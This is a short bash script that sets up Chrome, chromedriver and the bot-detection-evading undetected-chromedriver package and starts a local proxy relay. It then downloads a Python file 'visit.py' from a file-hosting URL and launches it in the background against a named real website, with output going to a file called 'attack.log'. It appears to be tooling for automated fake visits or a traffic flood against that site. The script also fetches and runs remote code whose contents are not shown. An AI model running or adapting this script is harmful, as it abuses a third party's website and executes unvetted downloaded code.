#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
killall -9 chrome chromedriver 2>/dev/null
kill -9 $(pgrep -f visit.py) 2>/dev/null
kill -9 $(pgrep -f proxy_relay) 2>/dev/null
sleep 1

# Install chrome if missing
if ! command -v google-chrome &>/dev/null; then
  wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
  apt-get install -y ./google-chrome-stable_current_amd64.deb 2>/dev/null
  apt-get install -f -y 2>/dev/null
  rm -f google-chrome-stable_current_amd64.deb
fi

# Install chromedriver 145
wget -q -O /tmp/cd.zip "https://storage.googleapis.com/chrome-for-testing-public/145.0.7632.117/linux64/chromedriver-linux64.zip"
cd /tmp && unzip -o cd.zip 2>/dev/null && cp chromedriver-linux64/chromedriver /usr/local/bin/ && chmod +x /usr/local/bin/chromedriver
rm -rf /tmp/cd.zip /tmp/chromedriver-linux64

# Install dependencies
apt-get install -y unzip >/dev/null 2>&1
pip3 install selenium undetected-chromedriver --break-system-packages 2>/dev/null || pip3 install selenium undetected-chromedriver 2>/dev/null

# Verify
google-chrome --version
chromedriver --version

# Start proxy
nohup python3 /root/proxy_relay.py > /root/proxy.log 2>&1 &
sleep 2
ss -tlnp | grep 18080 && echo "PROXY_OK" || echo "PROXY_FAIL"

# Download visit.py
wget -qO /root/visit.py "https://files.manuscdn.com/user_upload_by_module/session_file/310519663269537627/PzbMQYtXkthNkGig.py"

# Launch
nohup python3 /root/visit.py https://makansalameh.com 84 > /root/attack.log 2>&1 &
sleep 3
cat /root/visit_status.json 2>/dev/null
echo ""
echo "=== DONE ==="
